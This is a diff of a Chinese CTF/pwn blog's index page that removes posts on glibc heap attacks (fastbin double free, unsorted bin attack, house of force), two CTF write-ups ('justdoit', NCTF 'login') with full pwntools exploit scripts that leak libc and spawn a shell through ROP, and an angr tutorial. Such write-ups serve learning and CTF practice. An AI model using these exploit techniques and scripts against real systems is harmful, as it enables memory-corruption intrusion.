-<p>fast bins的double free检查存在的缺陷是它只检查准备放进来的这个chunk是否与上一个chunk相同，而不会检查整个链表中是否有跟这个chunk相同的chunk，这种简单的检查设计也是同时在兼顾着fast bins的速度问题，如果加入一些繁杂的检查机制会导致拖慢fast bins的速度。所以只要在第二次free掉一个已经free掉的chunk前free掉另一个chunk就可以绕过double free检查。</p>
-<p>① <code>int* a = malloc(8); int* b = malloc(8); int* c = malloc(8); </code></p>
-<p>首先malloc三块符合fast bins的chunk</p>
-<p>② <code>free(a); free(b); free(a);</code></p>
-<p>然后让a指针所对应的chunk释放两次，因为double free检查的存在，所以中间先把b指针所对应的chunk给free掉。到目前为止就得到了如下的fast bins结构：</p>
-<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/double-free-1.jpg" class>
-
-<p>③ <code>int* d = malloc(8); malloc(8);</code></p>
-<p>用指针d接收第二次被free掉的那块chunk，然后再malloc一次把中间的那块chunk去掉</p>
-<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/double-free-2.png" class>
-
-<p>到这里为止我们发现fast bins的指针跟指针d都指向了同一块chunk</p>
-<p>对于d的指针来说，a是一块malloced chunk，所以d的指针认为它所指的位置是数据体部分，可以往里任意写入数据，但在fast bin中的a是一块free chunk，a的数据体部分的第一个字长用作fd指针，所以d的指针可以通过写入数据来使fast bin中的a的fd指针指向任意位置。</p>
-<p>④ 通过d的指针将a的fd指针修改为栈上的一块内存</p>
-<p>因为在bin的链表中仅仅依靠指针来寻找和确定有无下一个chunk，所以修改fd指针后fast bin中就相当于多出了一个chunk，如下图：</p>
-<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/double-free-3.png" class>
-
-<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/double-free-4.png" class>
-
-<p>注意fd指针和堆返回的指针指向不同。应使要修改的栈上的值在fd指针下面两个字节处。</p>
-<h4 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted-bin-attack"></a>unsorted-bin-attack</h4><p>该攻击能达到的效果是向任意地址写入一个较大的数字，前提是能控制bk的值。</p>
-<p>该攻击虽然能向任意地址写，但不能控制写入的值，一般是作为其他攻击的铺垫。</p>
-<p>fast bins在32位平台中存放的chunk的大小在16-64之间，但这个限制实际上是由arena中的一个控制字段控制的，所以如果利用unsorted bin attack将这个控制字段修改，就能修改存放在fast bins中的chunk大小的限制，使得所有chunk被free掉之后都存入fast bins中，再结合fast bins的攻击达到控制程序执行流等目的。</p>
-<p>首先要了解从unsorted bin中取出一个chunk的流程</p>
-<p>下图是unsorted bin的结构</p>
-<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/unsorted-bin-attack-1.jpg" class>
-
-<p>当从unsorted bin从取出一个chunk（这里称为chunk1）时，为了保证unsorted bin的双向链表结构的完整，程序会修改unsorted bin表头的fd指针和被取出的chunk指向的下一块chunk（这里称为chunk2）的bk指针。</p>
-<p>那么如何将unsorted bin表头的fd指针和chunk2的bk指针修改为正确的值呢？显然这两个对应的值储存在chunk1的fd指针和bk指针中，所以此时unsorted bin表头的fd指针就会填上chunk1的fd指针的值，chunk2的bk指针就会填上chunk1的bk指针的值。</p>
-<p>最后形成如下结构</p>
-<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/unsorted-bin-attack-2.jpg" class>
-
-<p>由上过程我们可以发现，如果我们能够控制chunk1的fd指针的值，那么就相当于我们能够让任意地址作为chunk2，且在chunk1被取出的时候，程序就会自动向chunk2的对应位置中写入unsorted bin表头的所在地址，对于主进程来说，这个地址位于libc的数据段中，所以会是一个比较大的值。综上我们就完成了一个较大值的任意地址写。</p>
-<h4 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h4><p>需要：堆溢出</p>
-<p>通过堆溢出将top chunk的size控制字段修改成一个极大的数字，这是为了避免堆管理器在后面用mmap()系统调用来申请内存，以及让之后的内存申请都在top chunk中发生。</p>
-<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/house_of_force-1.jpg" class>
-
-<p>例如想修改栈上的一个值，我们第一次先malloc一个很大的空间，大到把栈的一部分也作为这块chunk的一部分，这块malloc的空间就会从top chunk当前的起始位置一直往内存的高地址划分，直到达到我们指定的大小，然后我们第二次再malloc一块chunk，那么这块chunk就会直接在栈上，此时我们就实现了往栈上写数据。</p>
-<p>而且如果我们malloc一个负数，那么就会在此时top chunk低地址处得到一块chunk（这是因为malloc的参数是无符号类型整数，所以我们传进一个负数的话会被解释成无符号类型整数，从而发生整数溢出，最后会得到从此时top chunk起始地址往低地址的一块对应大小的chunk），我们就可以用这种方式去修改程序段的某个地址的值。</p>
 
       
     </div>
@@ -1015,261 +1307,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/" class="post-title-link" itemprop="url">2021暗泉-justdoit</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-02-23 23:38:37" itemprop="dateCreated datePublished" datetime="2022-02-23T23:38:37+08:00">2022-02-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-02-24 00:25:18" itemprop="dateModified" datetime="2022-02-24T00:25:18+08:00">2022-02-24</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>首先看看题目，main函数如下</p>
-<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/main.png" class>
-
-<p>read_long() 函数如下</p>
-<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/read_long.jpg" class>
-
-<p>题目给的两处输入都没有溢出，但仔细观察main函数的汇编会发现有这个</p>
-<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-1.jpg" class>
-
-<p>因为read_long()函数中用到了 atol() 函数将我们的输入的字符串转化为整型，且这个函数的返回值就是转化后的整型值，显然 read_long() 函数加上红线汇编就起到让我们任意控制 rbp 的值，间接让我们控制了返回地址。同时因为main函数中的局部变量 buf[32] 并没有被初始化，我们就可以利用第一个输入在栈上布置返回地址，但是其只允许我们输入 0x18 个字节，也就是最多一次布置3条返回地址，但是因为我们首先需要泄漏libc，所以我们需要多次返回main函数完成ROP的布置以及泄漏，需要布置如下ROP：</p>
-<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-2.jpg" class>
-
-<p>那么我们第一次如下输入</p>
-<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-3.jpg" class>
-
-<p>然后将 rbp 拉到 rsp 的位置</p>
-<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-4.png" class>
-
-<p>leave_ret之后</p>
-<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-5.png" class>
-
-<p>再次执行到main函数的第一个read时的栈</p>
-<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-6.png" class>
-
-<p>由此完成泄漏ROP的布置</p>
-<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-7.jpg" class>
-
-<p>其实这部分很简单，简单分析下函数调用就完了，再往后getshell部分重复即可</p>
-<p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./justdoit&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./justdoit&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4011D5</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x04012b3</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x4011D5&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(main)*<span class="number">3</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">40</span>))</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">sys = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(main)*<span class="number">3</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(pop_rdi) + p64(binsh) + p64(sys))</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">40</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/22/ret2-libcsyscall/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/02/22/ret2-libcsyscall/" class="post-title-link" itemprop="url">ret2_libcsyscall</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-02-22 02:25:04 / 修改时间：03:03:16" itemprop="dateCreated datePublished" datetime="2022-02-22T02:25:04+08:00">2022-02-22</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>以 2.27 的 libc 版本为例，在如下函数的某处偏移中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;read + 15&gt;		syscall</span><br><span class="line">&lt;write + 18&gt;	syscall</span><br><span class="line">&lt;open64 + 76&gt;	syscall</span><br><span class="line">&lt;alarm + 5&gt;		syscall</span><br><span class="line">&lt;close + 18&gt;	syscall</span><br></pre></td></tr></table></figure>
-
-<p>这些函数的这些位置调用的就是<code>syscall</code>这个指令，如果能将某些函数的got修改为这些函数的这些位置就得到了syscall指令，而且由于 ASLR 对 libc 的随机化不会影响其最低12位（即最低3位16进制数），所以有时候当某个函数的 got 表跟其函数内部的 syscall 指令地址只有一个字节相差的时候，我们可以直接修改掉最低一字节即可，连爆破都不用。（好像都是只差一个字节）</p>
-<p>这个方法可以用在当我们需要构造 syscall 而程序中没有现存的 syscall 指令的时候。</p>
-<h3 id="2021NCTF-login"><a href="#2021NCTF-login" class="headerlink" title="2021NCTF-login"></a>2021NCTF-login</h3><p>例行保护</p>
-<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-checksec.jpg" class>
-
-<p>程序主逻辑如下</p>
-<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-main.png" class>
-
-<p>程序很简单，只有一个 0x10 字节长度的溢出，所以当然想到栈迁移到 .bss 段继续我们的构造。同时因为关闭了标准输出和标准错误输出，所以无法泄漏内存。</p>
-<p>那么我们自然会想到，如果无法泄漏内存的话只能我们手动makecall，那么一定会需要 syscall 指令，可惜程序中没有现存的 syscall 指令，那么我们尝试在已经调用了的函数中寻找。</p>
-<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-libcsyscall.jpg" class>
-
-<p>可以看到在 close 函数的 +21 处就是一条 syscall 指令，而且 close 函数在 main 函数中已经调用过，所以我们可以利用 read 函数直接修改其 got 表最低一字节，由此得到一条 syscall 指令。</p>
-<p>由此我们确定思路：将栈迁移到 .bss 段，同时在上面写好我们的ROP，①需要在已知地址写入’/bin/sh‘作参数。②需要修改 close 函数的 got 表得到 syscall 指令。③ makecall调用execve。</p>
-<p>细节慢慢调即可，exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line"></span><br><span class="line">csu_addr = <span class="number">0x40128A</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">call_addr,rdi,rsi,rdx</span>):</span></span><br><span class="line">	payload = p64(<span class="number">0</span>)  <span class="comment">#rbx</span></span><br><span class="line">	payload += p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">	payload += p64(rdi) <span class="comment">#r12</span></span><br><span class="line">	payload += p64(rsi) <span class="comment">#r13</span></span><br><span class="line">	payload += p64(rdx) <span class="comment">#r14</span></span><br><span class="line">	payload += p64(call_addr) <span class="comment">#r15</span></span><br><span class="line">	payload += p64(<span class="number">0x401270</span>) <span class="comment">#ret</span></span><br><span class="line">	payload += p64(<span class="number">1</span>) <span class="comment">#padding</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line">read = <span class="number">0x4011ED</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(bss + <span class="number">0x300</span>) + p64(read)</span><br><span class="line">p.sendafter(<span class="string">&quot;Welcome to NCTF2021!&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#write to bss+0x200</span></span><br><span class="line">payload = p64(<span class="number">0x40128A</span>) + csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,elf.got[<span class="string">&#x27;close&#x27;</span>],<span class="number">1</span>)</span><br><span class="line">payload += csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,bss+<span class="number">0x400</span>,<span class="number">59</span>)</span><br><span class="line">payload += csu(elf.got[<span class="string">&#x27;close&#x27;</span>],bss+<span class="number">0x400</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss+<span class="number">0x1f8</span>) + p64(<span class="number">0x40121F</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">&quot;\x85&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">59</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/13/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C-%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6angr/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/02/13/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C-%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6angr/" class="post-title-link" itemprop="url">符号执行-基于python的二进制分析框架angr</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-02-13 20:14:30" itemprop="dateCreated datePublished" datetime="2022-02-13T20:14:30+08:00">2022-02-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-02-16 22:48:57" itemprop="dateModified" datetime="2022-02-16T22:48:57+08:00">2022-02-16</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h4><p>[一篇比较好的文章](<a href="https://github.com/chyyuu/symexe/blob/master/klee_document/klee_analysis.md">symexe/klee_analysis.md at master · chyyuu/symexe · GitHub</a>)</p>
-<p>如果仅学习如何使用angr框架的话其实不需要对符号执行有过多了解，所以这里只做简单概述，更详细的地方可以看上面的文章。</p>
-<blockquote>
-<p>符号执行是指在不执行实际程序的前提下，把源程序翻译为一种中间语言，用符号值表示程序变量的值，然后基于中间语言模拟程序执行来进行相关分析的技术，它可以分析代码的所有语义信息，也可以只分析部分语义信息（如只分析“内存是否释放”这一部分的语义信息）。</p>
-<p>程序的路径（path）是程序的一个语句序列，这个语句序列包括程序的一些顺序的代码片段，代码片段之间的连接是由于分支语句导致的控制转移。一个路径是可行的（feasible），是指存在程序输入变量的至少一组值，如果以这组值作为输入，程序将沿着这条路径执行。否则，路径就是不可行的（infeasible）。路径条件（path condition,PC）是针对一个路径的，它是一个关于程序输入变量的符号值的约束，一组输入值使得程序沿着这条路径执行当且仅当这组输入值满足这条路径的路径条件。</p>
-</blockquote>
-<p>例如某个程序在执行过程中会执行如下语句</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> password[<span class="number">9</span>];</span><br><span class="line"><span class="keyword">char</span> *sneaky = <span class="string">&quot;SOSNEAKY&quot;</span>;</span><br><span class="line">read(<span class="number">0</span>, password, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, sneaky) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
-
-<p>显然在这条 if 分支语句处程序的执行路径就可以分成两条，分别对应 strcmp 函数的比较结果。同时显然至少存在一组值（”SOSNEAKY“）能使得这条分支语句中存在可行路径。</p>
-<h4 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h4><p><a target="_blank" rel="noopener" href="https://docs.angr.io/">官方手册</a></p>
-<p>angr的作用就在于能够得出上述的使得程序走”可行路径“的”至少一组值“。</p>
-<p>要注意的是符号执行的路径选择问题到现在依旧是一个很大的问题，换句话说也就是当我们的程序存在循环时，因为符号执行会尽量遍历所有的路径，所以每次循环之后会形成至少两个分支，当循环的次数足够多时，就会造成路径爆炸，整个机器的内存会被耗尽。</p>
-<p>我们以下面的例子来学习如何使用angr</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1335,14 +1376,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-count">42</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-count">27</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
